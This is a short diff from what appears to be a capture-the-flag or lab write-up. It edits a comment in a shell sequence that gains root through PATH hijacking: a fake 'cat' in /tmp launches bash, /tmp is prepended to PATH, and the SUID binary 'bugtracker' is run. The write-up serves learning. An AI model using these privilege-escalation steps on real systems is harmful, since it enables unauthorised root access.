@@ -82,7 +82,7 @@ This also can be done by finding SUID file: `-perm u=s`
 
 # Ok, let's manipulate $PATH variable to gain root access!
 cd /tmp
-echo "/bin/bash" > cat # spawn bash shell in root privileges!
+echo "/bin/bash" > cat # spawn bash shell
 export PATH=/tmp:$PATH
 /usr/bin/bugtracker # Enter bug ID: 0
 whoami # root
